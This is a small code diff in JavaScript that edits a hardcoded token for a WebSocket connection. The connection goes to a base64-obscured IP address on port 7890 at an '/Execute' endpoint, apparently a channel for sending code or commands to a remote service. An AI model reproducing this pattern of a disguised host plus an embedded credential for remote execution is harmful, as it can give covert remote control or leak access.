@@ -600,7 +600,7 @@
         const decodedIP = atob(encodedIP);
 
         function connectToWebSocket() {
-            const token = "AbdouGG";
+            const token = "AbdouGG.";
             socket = new WebSocket(`ws://${decodedIP}:7890/Execute?token=${token}`);
 
             socket.onopen = function() {
